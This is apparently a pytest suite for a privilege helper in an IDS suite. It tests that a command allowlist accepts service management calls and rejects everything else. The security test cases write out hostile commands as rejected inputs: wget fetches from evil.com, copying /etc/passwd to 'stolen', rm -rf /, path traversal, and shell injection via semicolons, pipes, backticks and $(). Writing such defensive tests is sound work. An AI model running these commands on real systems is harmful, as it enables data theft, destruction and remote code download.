"""
Tests for ids_suite/services/privilege_helper.py - Privileged command execution

Sprint 1.2: Privilege Helper tests
Target: 95% coverage of privilege helper functionality
"""

import os
import pytest
import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock, call
import subprocess

from ids_suite.services.privilege_helper import (
    validate_command,
    _is_safe_path,
    PrivilegeHelper,
    CommandResult,
    CommandValidationError,
    ALLOWED_COMMANDS,
    run_privileged_batch,
    restart_ids_services,
    restart_clamav_services,
    start_clamav_services,
    stop_clamav_services,
    update_and_reload_suricata,
    generate_polkit_rules,
)


class TestValidateCommandSystemctl:
    """Test systemctl command validation"""

    def test_valid_systemctl_start(self):
        """PH-001: Valid systemctl start command"""
        parts = validate_command("systemctl start suricata-laptop")
        assert parts == ["systemctl", "start", "suricata-laptop"]

    def test_valid_systemctl_stop(self):
        """PH-002: Valid systemctl stop command"""
        parts = validate_command("systemctl stop clamav-daemon")
        assert parts == ["systemctl", "stop", "clamav-daemon"]

    def test_valid_systemctl_restart(self):
        """PH-003: Valid systemctl restart command"""
        parts = validate_command("systemctl restart clamav-freshclam")
        assert parts == ["systemctl", "restart", "clamav-freshclam"]

    def test_valid_systemctl_enable_now(self):
        """PH-004: Valid systemctl enable --now command"""
        parts = validate_command("systemctl enable --now suricata-laptop")
        assert "enable" in parts
        assert "--now" in parts

    def test_valid_systemctl_disable_now(self):
        """PH-005: Valid systemctl disable --now command"""
        parts = validate_command("systemctl disable --now clamav-clamonacc")
        assert "disable" in parts

    def test_valid_systemctl_daemon_reload(self):
        """PH-006: Valid daemon-reload command"""
        parts = validate_command("systemctl daemon-reload")
        assert parts == ["systemctl", "daemon-reload"]

    def test_invalid_service_rejected(self):
        """PH-007: Unknown service rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("systemctl start malicious-service")
        assert "not allowed" in str(exc_info.value).lower()

    def test_invalid_action_rejected(self):
        """PH-008: Unknown action rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("systemctl mask suricata-laptop")
        assert "not allowed" in str(exc_info.value).lower()

    def test_systemctl_missing_service(self):
        """PH-009: Missing service name rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("systemctl start")
        assert "requires a service name" in str(exc_info.value).lower()

    def test_systemctl_missing_action(self):
        """PH-010: Missing action rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("systemctl")
        assert "requires at least an action" in str(exc_info.value).lower()

    def test_now_flag_only_with_enable_disable(self):
        """PH-011: --now flag only valid with enable/disable"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("systemctl start --now suricata-laptop")
        assert "--now" in str(exc_info.value).lower()

    def test_daemon_reload_no_extra_args(self):
        """PH-012: daemon-reload rejects extra arguments"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("systemctl daemon-reload suricata-laptop")
        assert "no additional arguments" in str(exc_info.value).lower()


class TestValidateCommandSuricatasc:
    """Test suricatasc command validation"""

    def test_valid_suricatasc_reload_rules(self):
        """PH-013: Valid suricatasc reload-rules"""
        parts = validate_command("suricatasc -c reload-rules")
        assert parts == ["suricatasc", "-c", "reload-rules"]

    def test_valid_suricatasc_uptime(self):
        """PH-014: Valid suricatasc uptime"""
        parts = validate_command("suricatasc -c uptime")
        assert "uptime" in parts

    def test_invalid_suricatasc_command(self):
        """PH-015: Invalid suricatasc command rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("suricatasc -c exec-something-bad")
        assert "not allowed" in str(exc_info.value).lower()

    def test_suricatasc_missing_command_arg(self):
        """PH-016: Missing command argument rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("suricatasc -c")
        assert "requires a command argument" in str(exc_info.value).lower()


class TestValidateCommandPaths:
    """Test path-validated commands (cp, chmod, rm, mkdir, chown)"""

    def test_valid_cp_safe_paths(self):
        """PH-017: Valid cp with safe paths"""
        parts = validate_command("cp /tmp/test.txt /etc/suricata/test.txt")
        assert parts[0] == "cp"

    def test_invalid_cp_unsafe_source(self):
        """PH-018: cp with unsafe source rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("cp /etc/passwd /tmp/stolen")
        assert "not in allowed locations" in str(exc_info.value).lower()

    def test_invalid_cp_unsafe_dest(self):
        """PH-019: cp with unsafe destination rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("cp /tmp/file /etc/passwd")
        assert "not in allowed locations" in str(exc_info.value).lower()

    def test_valid_chmod_safe_path(self):
        """PH-020: Valid chmod with safe path"""
        parts = validate_command("chmod 644 /etc/suricata/rules.yaml")
        assert parts == ["chmod", "644", "/etc/suricata/rules.yaml"]

    def test_invalid_chmod_mode(self):
        """PH-021: Invalid chmod mode rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("chmod 777 /tmp/file")
        assert "not allowed" in str(exc_info.value).lower()

    def test_valid_rm_safe_path(self):
        """PH-022: Valid rm with safe path"""
        parts = validate_command("rm -f /tmp/test.txt")
        assert "-f" in parts

    def test_invalid_rm_unsafe_path(self):
        """PH-023: rm with unsafe path rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("rm /etc/passwd")
        assert "not in allowed locations" in str(exc_info.value).lower()

    def test_invalid_rm_flag(self):
        """PH-024: rm with forbidden flag rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("rm -rf /tmp/dir")
        assert "not allowed" in str(exc_info.value).lower()

    def test_valid_mkdir_safe_path(self):
        """PH-025: Valid mkdir with safe path"""
        parts = validate_command("mkdir -p /tmp/newdir")
        assert parts == ["mkdir", "-p", "/tmp/newdir"]

    def test_invalid_mkdir_unsafe_path(self):
        """PH-026: mkdir with unsafe path rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("mkdir /etc/newdir")
        assert "not in allowed locations" in str(exc_info.value).lower()

    def test_valid_chown_safe_path(self):
        """PH-027: Valid chown with safe path"""
        parts = validate_command("chown clamav:clamav /var/lib/clamav/test")
        assert parts[0] == "chown"

    def test_valid_chown_clamupdate(self):
        """PH-027b: Valid chown with clamupdate (Fedora) owner"""
        parts = validate_command("chown clamupdate:clamupdate /var/lib/clamav/test")
        assert parts[0] == "chown"
        assert parts[1] == "clamupdate:clamupdate"

    def test_invalid_chown_owner(self):
        """PH-028: chown with invalid owner rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("chown root:wheel /tmp/file")
        assert "not allowed" in str(exc_info.value).lower()


class TestValidateCommandOther:
    """Test other command validations"""

    def test_valid_suricata_update(self):
        """PH-029: Valid suricata-update command"""
        parts = validate_command("suricata-update --no-test")
        assert parts == ["suricata-update", "--no-test"]

    def test_suricata_update_too_many_args(self):
        """PH-030: suricata-update with too many args rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("suricata-update --no-test --reload-command /bin/true extra")
        assert "maximum" in str(exc_info.value).lower()

    def test_valid_freshclam(self):
        """PH-031: Valid freshclam command"""
        parts = validate_command("freshclam")
        assert parts == ["freshclam"]

    def test_freshclam_too_many_args(self):
        """PH-032: freshclam with too many args rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("freshclam --extra-arg")
        assert "maximum" in str(exc_info.value).lower()

    def test_unknown_command_rejected(self):
        """PH-033: Unknown command rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("wget http://evil.com/payload")
        assert "not in the allowed command list" in str(exc_info.value).lower()

    def test_empty_command_rejected(self):
        """PH-034: Empty command rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command("")
        assert "empty command" in str(exc_info.value).lower()

    def test_invalid_shell_syntax_rejected(self):
        """PH-035: Invalid shell syntax rejected"""
        with pytest.raises(CommandValidationError) as exc_info:
            validate_command('systemctl start "unclosed quote')
        assert "invalid command syntax" in str(exc_info.value).lower()


class TestIsSafePath:
    """Test path safety validation"""

    def test_tmp_path_safe(self):
        """PH-036: /tmp/ paths are safe"""
        assert _is_safe_path("/tmp/file.txt") is True
        assert _is_safe_path("/tmp/subdir/file.txt") is True

    def test_var_tmp_safe(self):
        """PH-037: /var/tmp/ paths are safe"""
        assert _is_safe_path("/var/tmp/file.txt") is True

    def test_etc_suricata_safe(self):
        """PH-038: /etc/suricata/ paths are safe"""
        assert _is_safe_path("/etc/suricata/suricata.yaml") is True

    def test_etc_clamav_safe(self):
        """PH-039: /etc/clamav/ paths are safe"""
        assert _is_safe_path("/etc/clamav/clamd.conf") is True

    def test_var_lib_clamav_safe(self):
        """PH-040: /var/lib/clamav/ paths are safe"""
        assert _is_safe_path("/var/lib/clamav/daily.cvd") is True

    def test_polkit_rules_safe(self):
        """PH-041: PolicyKit rules directory is safe"""
        assert _is_safe_path("/etc/polkit-1/rules.d/50-test.rules") is True

    def test_etc_passwd_unsafe(self):
        """PH-042: /etc/passwd is not safe"""
        assert _is_safe_path("/etc/passwd") is False

    def test_root_home_unsafe(self):
        """PH-043: /root/ is not safe"""
        assert _is_safe_path("/root/.ssh/id_rsa") is False

    def test_relative_path_resolved(self):
        """PH-044: Relative paths are resolved"""
        # Traversal attempt should be blocked
        assert _is_safe_path("/tmp/../etc/passwd") is False

    def test_double_traversal_blocked(self):
        """PH-045: Double traversal attempts blocked"""
        assert _is_safe_path("/tmp/../../etc/passwd") is False


class TestPrivilegeHelperClass:
    """Test PrivilegeHelper class methods"""

    def test_init_default_strategy(self):
        """PH-046: Default strategy is 'batch'"""
        helper = PrivilegeHelper()
        assert helper.strategy == "batch"

    def test_init_custom_strategy(self):
        """PH-047: Custom strategy can be set"""
        helper = PrivilegeHelper(strategy="sudo_cache")
        assert helper.strategy == "sudo_cache"

    def test_add_command_valid(self):
        """PH-048: Valid command is added to pending"""
        helper = PrivilegeHelper()
        helper.add_command("systemctl status suricata-laptop")
        assert len(helper._pending_commands) == 1

    def test_add_command_invalid_raises(self):
        """PH-049: Invalid command raises error"""
        helper = PrivilegeHelper()
        with pytest.raises(CommandValidationError):
            helper.add_command("rm -rf /")

    def test_clear_pending(self):
        """PH-050: clear_pending removes all commands"""
        helper = PrivilegeHelper()
        helper.add_command("systemctl status suricata-laptop")
        helper.add_command("systemctl status clamav-daemon")
        assert len(helper._pending_commands) == 2

        helper.clear_pending()
        assert len(helper._pending_commands) == 0

    def test_execute_batch_no_commands(self):
        """PH-051: Empty batch returns success"""
        helper = PrivilegeHelper()
        result = helper.execute_batch()
        assert result.success is True
        assert result.commands_run == 0

    @patch('subprocess.run')
    def test_execute_batch_success(self, mock_run):
        """PH-052: Successful batch execution"""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="Command executed",
            stderr=""
        )

        helper = PrivilegeHelper()
        result = helper.execute_batch(["systemctl status suricata-laptop"])

        assert result.success is True
        assert result.commands_run == 1
        assert mock_run.called

    @patch('subprocess.run')
    def test_execute_batch_failure(self, mock_run):
        """PH-053: Failed batch execution"""
        mock_run.return_value = MagicMock(
            returncode=1,
            stdout="",
            stderr="Permission denied"
        )

        helper = PrivilegeHelper()
        result = helper.execute_batch(["systemctl status suricata-laptop"])

        assert result.success is False
        assert result.returncode == 1

    def test_execute_batch_validation_failure(self):
        """PH-054: Invalid command in batch causes failure"""
        helper = PrivilegeHelper()
        result = helper.execute_batch(["invalid-command"])

        assert result.success is False
        assert "validation failed" in result.message.lower()

    @patch('subprocess.run')
    def test_execute_batch_timeout(self, mock_run):
        """PH-055: Timeout during batch execution"""
        mock_run.side_effect = subprocess.TimeoutExpired(cmd="test", timeout=300)

        helper = PrivilegeHelper()
        result = helper.execute_batch(["systemctl status suricata-laptop"])

        assert result.success is False
        assert "timed out" in result.message.lower()

    @patch('subprocess.run')
    def test_execute_batch_with_callback(self, mock_run):
        """PH-056: Output callback is called"""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="Line 1\nLine 2",
            stderr=""
        )

        output_lines = []

        def callback(line):
            output_lines.append(line)

        helper = PrivilegeHelper()
        helper.execute_batch(["systemctl status suricata-laptop"], on_output=callback)

        assert len(output_lines) > 0

    @patch('subprocess.run')
    def test_execute_sudo_cached_auth_failure(self, mock_run):
        """PH-057: Sudo auth failure returns error"""
        mock_run.return_value = MagicMock(
            returncode=1,
            stdout="",
            stderr="Authentication failed"
        )

        helper = PrivilegeHelper(strategy="sudo_cache")
        result = helper.execute_batch(["systemctl status suricata-laptop"])

        assert result.success is False

    @patch('subprocess.run')
    def test_execute_direct_strategy(self, mock_run):
        """PH-058: Direct strategy executes commands"""
        mock_run.return_value = MagicMock(
            returncode=0,
            stdout="OK",
            stderr=""
        )

        helper = PrivilegeHelper(strategy="direct")
        result = helper.execute_batch(["systemctl status suricata-laptop"])

        assert result.success is True


class TestCommandResult:
    """Test CommandResult dataclass"""

    def test_command_result_defaults(self):
        """PH-059: CommandResult has correct defaults"""
        result = CommandResult(
            success=True,
            message="OK",
            returncode=0
        )
        assert result.stdout == ""
        assert result.stderr == ""
        assert result.commands_run == 0

    def test_command_result_all_fields(self):
        """PH-060: CommandResult stores all fields"""
        result = CommandResult(
            success=False,
            message="Error occurred",
            returncode=1,
            stdout="output",
            stderr="error",
            commands_run=5
        )
        assert result.success is False
        assert result.message == "Error occurred"
        assert result.returncode == 1
        assert result.stdout == "output"
        assert result.stderr == "error"
        assert result.commands_run == 5


class TestConvenienceFunctions:
    """Test convenience functions"""

    @patch('ids_suite.services.privilege_helper.run_privileged_batch')
    def test_restart_ids_services(self, mock_batch):
        """PH-061: restart_ids_services calls correct command"""
        mock_batch.return_value = CommandResult(True, "OK", 0)

        result = restart_ids_services()

        mock_batch.assert_called_once()
        call_args = mock_batch.call_args[0][0]
        assert any("suricata" in cmd for cmd in call_args)

    @patch('ids_suite.services.privilege_helper.run_privileged_batch')
    def test_restart_clamav_services(self, mock_batch):
        """PH-062: restart_clamav_services calls correct commands"""
        mock_batch.return_value = CommandResult(True, "OK", 0)

        result = restart_clamav_services()

        mock_batch.assert_called_once()
        call_args = mock_batch.call_args[0][0]
        assert len(call_args) == 3  # daemon, freshclam, clamonacc

    @patch('ids_suite.services.privilege_helper.run_privileged_batch')
    def test_start_clamav_services(self, mock_batch):
        """PH-063: start_clamav_services calls start commands"""
        mock_batch.return_value = CommandResult(True, "OK", 0)

        result = start_clamav_services()

        mock_batch.assert_called_once()
        call_args = mock_batch.call_args[0][0]
        assert all("start" in cmd for cmd in call_args)

    @patch('ids_suite.services.privilege_helper.run_privileged_batch')
    def test_stop_clamav_services(self, mock_batch):
        """PH-064: stop_clamav_services calls stop commands"""
        mock_batch.return_value = CommandResult(True, "OK", 0)

        result = stop_clamav_services()

        mock_batch.assert_called_once()
        call_args = mock_batch.call_args[0][0]
        assert all("stop" in cmd for cmd in call_args)

    @patch('ids_suite.services.privilege_helper.run_privileged_batch')
    def test_update_and_reload_suricata(self, mock_batch):
        """PH-065: update_and_reload_suricata calls correct commands"""
        mock_batch.return_value = CommandResult(True, "OK", 0)

        result = update_and_reload_suricata()

        mock_batch.assert_called_once()
        call_args = mock_batch.call_args[0][0]
        assert any("suricata-update" in cmd for cmd in call_args)
        assert any("reload-rules" in cmd for cmd in call_args)


class TestPolkitRules:
    """Test PolicyKit rules generation"""

    def test_generate_polkit_rules_content(self):
        """PH-066: Generated rules have correct structure"""
        rules = generate_polkit_rules()

        # Check for key elements
        assert "polkit.addRule" in rules
        assert "suricata-laptop.service" in rules
        assert "clamav-daemon.service" in rules
        assert "wheel" in rules
        assert "org.freedesktop.systemd1.manage-units" in rules

    def test_generate_polkit_rules_valid_js(self):
        """PH-067: Generated rules are syntactically reasonable"""
        rules = generate_polkit_rules()

        # Basic JS syntax checks
        assert rules.count("{") == rules.count("}")
        assert rules.count("(") == rules.count(")")
        assert "return polkit.Result" in rules


class TestAllowedCommandsConfig:
    """Test ALLOWED_COMMANDS configuration"""

    def test_systemctl_has_services(self):
        """PH-068: systemctl config has allowed services"""
        config = ALLOWED_COMMANDS['systemctl']
        assert 'allowed_services' in config
        assert 'suricata-laptop' in config['allowed_services']
        assert 'clamav-daemon' in config['allowed_services']

    def test_systemctl_has_actions(self):
        """PH-069: systemctl config has allowed actions"""
        config = ALLOWED_COMMANDS['systemctl']
        assert 'allowed_args' in config
        assert 'start' in config['allowed_args']
        assert 'stop' in config['allowed_args']
        assert 'restart' in config['allowed_args']

    def test_path_validated_commands_exist(self):
        """PH-070: Path-validated commands are configured"""
        for cmd in ['cp', 'chmod', 'rm', 'mkdir', 'chown']:
            assert cmd in ALLOWED_COMMANDS
            config = ALLOWED_COMMANDS[cmd]
            assert config.get('validate_paths') is True


class TestSecurityCases:
    """Security-focused test cases"""

    def test_shell_injection_semicolon_blocked(self):
        """PH-071: Shell injection via semicolon blocked"""
        # shlex.split handles this as an argument, but the service won't be valid
        with pytest.raises(CommandValidationError):
            validate_command("systemctl start suricata; rm -rf /")

    def test_shell_injection_pipe_blocked(self):
        """PH-072: Shell injection via pipe blocked"""
        with pytest.raises(CommandValidationError):
            validate_command("systemctl status suricata | cat /etc/passwd")

    def test_shell_injection_backticks_blocked(self):
        """PH-073: Shell injection via backticks blocked"""
        with pytest.raises(CommandValidationError):
            validate_command("systemctl start `whoami`")

    def test_shell_injection_dollar_blocked(self):
        """PH-074: Shell injection via $() blocked"""
        with pytest.raises(CommandValidationError):
            validate_command("systemctl start $(whoami)")

    def test_path_traversal_blocked(self):
        """PH-075: Path traversal attacks blocked"""
        with pytest.raises(CommandValidationError):
            validate_command("cp /tmp/../etc/passwd /tmp/stolen")

    def test_absolute_path_not_in_whitelist(self):
        """PH-076: Full path to non-whitelisted command blocked"""
        with pytest.raises(CommandValidationError):
            validate_command("/usr/bin/wget http://evil.com")
